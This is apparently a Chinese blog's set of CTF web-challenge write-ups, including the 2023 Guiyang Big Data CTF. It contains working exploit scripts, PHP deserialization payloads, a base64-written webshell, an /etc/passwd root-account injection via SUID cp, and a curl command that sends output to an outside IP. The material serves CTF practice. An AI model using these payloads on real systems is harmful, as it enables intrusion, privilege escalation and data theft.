<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_letters + string.digits:</span><br><span class="line">        burp0_url = <span class="string">&quot;http://eci-2ze9ta9edjrri34x6quu.cloudeci1.ichunqiu.com:80/wp-admin/admin-ajax.php&quot;</span></span><br><span class="line">        burp0_cookies = &#123;</span><br><span class="line">            <span class="string">&quot;wordpress_945fc09f9fc43687ccf959db02ecaf45&quot;</span>: <span class="string">&quot;south%7C1659408111%7CYWQvsxTWQkfN0G6SJfE1igTuSVdQpeBo4I5hQRHxPOD%7C74d4b198bdd387d32810c0857a838372b4e1d452b946f50ed38d904388e07a34&quot;</span>,</span><br><span class="line">            <span class="string">&quot;wordpress_logged_in_945fc09f9fc43687ccf959db02ecaf45&quot;</span>: <span class="string">&quot;south%7C1659408111%7CYWQvsxTWQkfN0G6SJfE1igTuSVdQpeBo4I5hQRHxPOD%7C5b0af441d41b94827cf31d69758ca92f902616a95558444eb92cc9dee011d9bb&quot;</span>,</span><br><span class="line">            <span class="string">&quot;wp-settings-time-2&quot;</span>: <span class="string">&quot;1659236134&quot;</span>&#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://eci-2ze9ta9edjrri34x6quu.cloudeci1.ichunqiu.com&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://eci-2ze9ta9edjrri34x6quu.cloudeci1.ichunqiu.com/index.php/upload/&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">        burp0_data = &#123;<span class="string">&quot;field_name&quot;</span>: <span class="string">&quot;upload&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;filepath&quot;</span>: <span class="string">&quot;/../../../../../../../../../../../../../../password/&quot;</span> + <span class="built_in">str</span>(j) + i,</span><br><span class="line">                      <span class="string">&quot;field_id&quot;</span>: <span class="string">&quot;um_field_2&quot;</span>, <span class="string">&quot;form_key&quot;</span>: <span class="string">&quot;upload&quot;</span>, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;um_show_uploaded_file&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;pf_nonce&quot;</span>: <span class="string">&quot;6ca6fde673&quot;</span>, <span class="string">&quot;is_ajax&quot;</span>: <span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line">        r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;um_remove_file&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(i, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>拿到密码是<strong>MaoGeYaoQiFeiLa</strong>，上去后主题文件写马，<strong>flag</strong>在<strong>/usr/local/This_1s_secret</strong>下面。</p>
<h1 id="refer">Refer</h1>
<p><a
href="https://cloud.tencent.com/developer/article/1806265"><strong>JSON
Parsers</strong> 差异安全问题探索</a></p>
<p><strong><a
href="https://www.freebuf.com/articles/web/321297.html">CVE-2022-21661</a></strong></p>
<p><a
href="https://github.com/lanzt/CVE-2020-14321"><strong>CVE-2020-14321</strong></a></p>
<p><strong><a
href="https://github.com/h4ckologic/CVE-2019-17221">CVE-2019-17221</a></strong></p>
<p><a
href="https://zhuanlan.zhihu.com/p/32942490">论<strong>Web</strong>狗如何在<strong>CTF</strong>中苟到最后</a></p>
<p><strong><a
href="https://wpscan.com/vulnerability/9d4a3f09-b011-4d87-ab63-332e505cf1cd">CVE-2022-0779</a></strong></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 贵阳大数据 CTF 部分题解</title>
    <url>/2023-GYBD/</url>
    <content><![CDATA[<p>摸一下。</p>
<span id="more"></span>
<h3 id="仔细ping">仔细ping</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=nl%20flag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Ping吗!&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/br&gt;&lt;pre&gt;     1	&lt;?php</span><br><span class="line">       </span><br><span class="line">     2	$flag = &quot;flag&#123;CAmbVbbBafY6k3tRybmqvqvWJYg8ms7s&#125;&quot;;</span><br><span class="line">     3	?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="may_be">May_be</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $a))  &#123;</span><br><span class="line">    if (!preg_match(&quot;/sess|ion|head|ers|file|na|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&quot;,$a))&#123;</span><br><span class="line">        eval($a);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;May be you should bypass.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;nonono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://39.107.68.43:35894/?a=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">1=system(&#x27;ls /&#x27;);</span><br><span class="line">bin boot dev etc home lib lib64 media mnt opt proc pushflag.sh root run sbin srv start.sh sys tmp usr var</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#flag单独写在某个文件中 #!/bin/bash echo $1 &gt; /.ffffffIIIIIII44444444444gggg</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;&#x27;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-rwsr-xr-x 1 root root 151168 Sep 24  2020 /bin/cp</span><br><span class="line">-rwsr-xr-x 1 root root 55528 Jan 20  2022 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 71912 Jan 20  2022 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 35040 Jan 20  2022 /bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;echo &quot;PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWzFdKTs=&quot; | base64 -d &gt; 1.php&#x27;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root2::0:0::/root:/bin/bash</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(www-data:/tmp) $ cp /tmp/passwd /etc/passwd</span><br><span class="line">(www-data:/tmp) $ su root2 -c &quot;/.ffffffIIIIIII44444444444gggg&quot;</span><br><span class="line">/.ffffffIIIIIII44444444444gggg: line 1: flag&#123;mhbFHhwweJj4QuhveSQTsYXUCscvMbNd&#125;: command not found</span><br></pre></td></tr></table></figure>
<h3 id="notrce">notrce</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l&#x27;&#x27;s | cu&#x27;&#x27;rl -d @- -X POST http://175.178.111.34:7777</span><br></pre></td></tr></table></figure>
<h3 id="pop">pop</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class TT&#123;</span><br><span class="line">    public $key;</span><br><span class="line">    public $c;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;welcome&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class JJ&#123;</span><br><span class="line">    public $obj;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        ($this -&gt; obj)();</span><br><span class="line">        return &quot;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function evil($c)&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MM&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $c;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        ($this-&gt;name)($this-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;ok,but wrong&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($a, $b)&#123;</span><br><span class="line">        echo &quot;Hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = unserialize($_GET[&#x27;bbb&#x27;]);</span><br><span class="line">throw new Error(&quot;NoNoNo&quot;);</span><br><span class="line"></span><br><span class="line">Fatal error: Uncaught Error: NoNoNo in /var/www/html/index.php:43 Stack trace: #0 &#123;main&#125; thrown in /var/www/html/index.php on line 43</span><br></pre></td></tr></table></figure>
<p>在MM类的<code>__invoke</code>函数getshell，需要把MM当函数处理，在JJ的<code>__toString</code>把<code>$this -&gt; obj</code>当函数处理了，在TT的<code>__destruct</code>把<code>$this-&gt;key</code>当字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class TT&#123;</span><br><span class="line">    public $key;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class JJ&#123;</span><br><span class="line">    public $obj;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class MM&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = new MM();</span><br><span class="line">$c-&gt;name = &quot;system&quot;;</span><br><span class="line">$c-&gt;c = &quot;cat /flag&quot;;</span><br><span class="line"></span><br><span class="line">$b = new JJ();</span><br><span class="line">$b -&gt; obj = $c;</span><br><span class="line"></span><br><span class="line">$a = new TT();</span><br><span class="line">$a-&gt;key = $b;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo serialize($arr);</span><br></pre></td></tr></table></figure>
<p>throw new Error("NoNoNo");</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://123.56.174.142:52862/?bbb=O:2:%22TT%22:2:&#123;s:3:%22key%22;O:2:%22JJ%22:1:&#123;s:3:%22obj%22;O:2:%22MM%22:2:&#123;s:4:%22name%22;s:6:%22system%22;s:1:%22c%22;s:9:%22cat%20/flag%22;&#125;&#125;s:1:%22c%22;N;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ftJmMSTRfrtuYvNrXyndyMT9vnX4hGhr&#125; 1</span><br></pre></td></tr></table></figure>
<h3 id="hackerconfused">Hackerconfused</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$CanRead = false;</span><br><span class="line">class SFile&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $num = count(scandir($this-&gt;name));</span><br><span class="line">        if($num &gt; 0)&#123;</span><br><span class="line">            return &#x27;Not null&#x27;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#x27;Access the backdoor_******.php.* in [0-f]&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Funny&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __construct($name)&#123;</span><br><span class="line">        if(strstr($name, &#x27;backdoor&#x27;)===false)&#123;</span><br><span class="line">            $this-&gt;name = $name;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;name = &#x27;nohint.txt&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        global $CanRead;</span><br><span class="line">        if(strstr($name, &#x27;backdoor&#x27;)!==false)&#123;</span><br><span class="line">            die(&#x27;try again&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        if($CanRead)&#123;</span><br><span class="line">            echo(file_get_contents($this-&gt;name));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $secret = &#x27;nohint.txt&#x27;;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo $this-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        global $CanRead;</span><br><span class="line">        $CanRead = true;</span><br><span class="line">        return (new Funny($this-&gt;secret))-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;p&#x27;]))&#123;</span><br><span class="line">    unserialize(base64_decode($_GET[&#x27;p&#x27;]));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SFile&#123;</span><br><span class="line">    public $name ;</span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Funny&#123;</span><br><span class="line">    public $name;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $secret;</span><br><span class="line">&#125;</span><br><span class="line">$path = $_GET[&quot;path&quot;];</span><br><span class="line">$fun = new Fun();</span><br><span class="line">$fun-&gt;secret = new SFile($path);</span><br><span class="line">echo urlencode(base64_encode(serialize($fun)));</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">path = &quot;glob://./backdoor_&quot;</span><br><span class="line">get_payload_url = &quot;http://127.0.0.1:7777/2023/gz/no.php&quot;</span><br><span class="line">exp_url = &quot;http://47.93.30.67:38017/&quot;</span><br><span class="line">dic = &quot;1234567890abcdef.ph&quot;</span><br><span class="line"></span><br><span class="line">flag = True</span><br><span class="line">while flag:</span><br><span class="line">    flag = False</span><br><span class="line">    for i in dic:</span><br><span class="line">        r = requests.get(url=get_payload_url, params=&#123;&quot;path&quot;: path + i + &quot;*&quot;&#125;)</span><br><span class="line">        p = r.text</span><br><span class="line">        r = requests.get(url=exp_url, params=&#123;&quot;p&quot;: p&#125;)</span><br><span class="line">        if r.text == &quot;Not null&quot;:</span><br><span class="line">            path = path + i</span><br><span class="line">            flag = True</span><br><span class="line">            print(path)</span><br><span class="line">            break</span><br><span class="line"># glob://./backdoor_a5f9d3.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Funny&#123;</span><br><span class="line">    public $name = &quot;php://filter/convert.base64-encode/resource=backdoor_a5f9d3.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$fun = new Fun();</span><br><span class="line">$fun2 = new Fun();</span><br><span class="line">$fun-&gt;secret = new Funny();</span><br><span class="line">$fun2-&gt;secret = $fun;</span><br><span class="line">//unserialize(serialize($fun2));</span><br><span class="line">echo urlencode(base64_encode(serialize($fun2)));</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://47.93.30.67:38017/?p=TzozOiJGdW4iOjE6e3M6Njoic2VjcmV0IjtPOjM6IkZ1biI6MTp7czo2OiJzZWNyZXQiO086NToiRnVubnkiOjE6e3M6NDoibmFtZSI7czo2MzoicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1iYWNrZG9vcl9hNWY5ZDMucGhwIjt9fX0%3D</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">f = open(&quot;1&quot;)</span><br><span class="line">f_res = base64.b64decode(f.read())</span><br><span class="line">f_res = f_res.replace(&quot;eval&quot;.encode(), &quot;print_r&quot;.encode())</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">ff = open(&quot;1.php&quot;, &quot;w&quot;)</span><br><span class="line">ff.write(f_res.decode())</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    r = os.popen(&quot;/Applications/MAMP/bin/php/php8.2.0/bin/php 1.php&quot;).read().strip()</span><br><span class="line">    print(len(r))</span><br><span class="line">    ff = open(&quot;1.php&quot;, &quot;w&quot;)</span><br><span class="line">    if &quot;error&quot; in r:</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        ff.write(&quot;&lt;?php echo&quot; + r[4:])</span><br><span class="line">        print(r)</span><br><span class="line">    ff.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$erzo_f851f55b = [base64_decode(&#x27;ZmxhZ3sjX2FiY2RlZn0=&#x27;), base64_decode(&#x27;ZmxhZ3tiMHdfYjB3fQ==&#x27;), base64_decode(&#x27;ZmxhZ3t0ZXRfZmxhZ30=&#x27;), base64_decode(&#x27;ZmxhZ3s5OSF6elN3Y30=&#x27;), base64_decode(&#x27;ZmxhZ3tkZWJ1R19mdHd9&#x27;), base64_decode(&#x27;ZmxhZ3toZWxsX3llYWh9&#x27;), base64_decode(&#x27;ZmxhZ3t0NHN0fQ==&#x27;)];</span><br><span class="line">$igxc_9ce88802 = &#x27;&#x27;;</span><br><span class="line">$bbmg_1b267619 = 0;</span><br><span class="line">foreach ($erzo_f851f55b as &amp;$djkg_417c4fa3) &#123;</span><br><span class="line">    $igxc_9ce88802 = $djkg_417c4fa3[$bbmg_1b267619] . $igxc_9ce88802;</span><br><span class="line">    $bbmg_1b267619++;</span><br><span class="line">&#125;;</span><br><span class="line">if (isset($_GET[$igxc_9ce88802])) &#123;</span><br><span class="line">    $grxe_fd6b6fc9 = $_GET[$igxc_9ce88802];</span><br><span class="line">    $pgck_32cfe6c1 = base64_decode($grxe_fd6b6fc9);</span><br><span class="line">    $jipp_8a561003 = substr($pgck_32cfe6c1, 5, -5);</span><br><span class="line">    echo $jipp_8a561003;</span><br><span class="line">    system($jipp_8a561003);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo base64_decode(&#x27;NDA0&#x27;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://47.93.30.67:38017/backdoor_a5f9d3.php?4h&#123;galf=YWFhYWFscyAvYWFhYWE=</span><br><span class="line">/readflagUsage: /readflag give me the flag</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://47.93.30.67:38017/backdoor_a5f9d3.php?4h&#123;galf=YWFhYWEvcmVhZGZsYWcgZ2l2ZSBtZSB0aGUgZmxhZ2FhYWFh</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/readflag give me the flagflag&#123;cQfGDnSt85Mxkua2u9hxSeshES8sK2s8&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    </span><br><span class="line">    if(argc &lt; 5) &#123;</span><br><span class="line">        printf(&quot;Usage: %s give me the flag\n&quot;, argv[0]);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ((strcmp(argv[1], &quot;give&quot;) | strcmp(argv[2], &quot;me&quot;) | strcmp(argv[3], &quot;the&quot;) | strcmp(argv[4], &quot;flag&quot;)) != 0) &#123;</span><br><span class="line">        puts(&quot;You are not worthy&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char flag[256] = &#123; 0 &#125;;</span><br><span class="line">    FILE* fp = fopen(&quot;/flag&quot;, &quot;r&quot;);</span><br><span class="line">    if (!fp) &#123;</span><br><span class="line">        perror(&quot;fopen&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    if (fread(flag, 1, 256, fp) &lt; 0) &#123;</span><br><span class="line">        perror(&quot;fread&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(flag);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="完美网站">完美网站</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://39.107.27.191:21600/\?img\=dHVwaWFuLnBuZw\=\=</span><br><span class="line">别重定向了，赶快让我（?n=30-10,以内的数值。)-_-&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: n in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;11&lt;/b&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure>
<p>固定n爆破拿到图片，尾部ffffpq.php。</p>
<h3 id="不太喜欢flask的开发">不太喜欢flask的开发</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 123.56.175.221:48127</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh-CN;q=0.9,zh;q=0.8,en;q=0.7,ja;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/2.2.3 Python/3.10.1</span><br><span class="line">Date: Fri, 28 Apr 2023 14:37:37 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 115</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">you are not our client,please guess our SECRET_KEY and Generating cookies using keys ,then view /search?flag=***** </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /search?flag=***** HTTP/1.1</span><br><span class="line">Host: 123.56.175.221:48127</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh-CN;q=0.9,zh;q=0.8,en;q=0.7,ja;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 401 UNAUTHORIZED</span><br><span class="line">Server: Werkzeug/2.2.3 Python/3.10.1</span><br><span class="line">Date: Fri, 28 Apr 2023 14:39:32 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 49</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;msg&quot;:&quot;Missing cookie \&quot;access_token_cookie\&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>Jwt加密，密码是tomcat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;admin&quot;</span><br><span class="line">&#125;</span><br><span class="line"># eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.p7j5Fnbpfmw45f43J0ZkFs_JXs1h_rRozLAZEjsbdVM</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /search?flag=&#123;&#123;config&#125;&#125; HTTP/1.1</span><br><span class="line">Host: 123.56.175.221:48127</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh-CN;q=0.9,zh;q=0.8,en;q=0.7,ja;q=0.6</span><br><span class="line">Cookie: access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.p7j5Fnbpfmw45f43J0ZkFs_JXs1h_rRozLAZEjsbdVM</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>提示flag{the_flag_in_the_source_code}</p>
